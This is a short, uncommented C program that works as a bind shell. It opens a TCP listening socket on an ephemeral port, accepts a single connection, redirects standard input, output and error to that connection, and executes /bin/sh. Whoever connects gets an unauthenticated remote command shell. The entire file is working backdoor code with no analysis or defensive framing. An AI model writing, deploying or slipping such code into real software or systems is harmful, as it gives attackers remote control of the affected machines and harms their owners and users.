#include <netinet/in.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    listen(sockfd, 1);
    int clientfd = accept(sockfd, NULL, NULL);
    dup2(clientfd, 0);
    dup2(clientfd, 1);
    dup2(clientfd, 2);
    char * const argv[] = {"sh",NULL, NULL};
    execve("/bin/sh", argv, NULL);
    return 0;
}
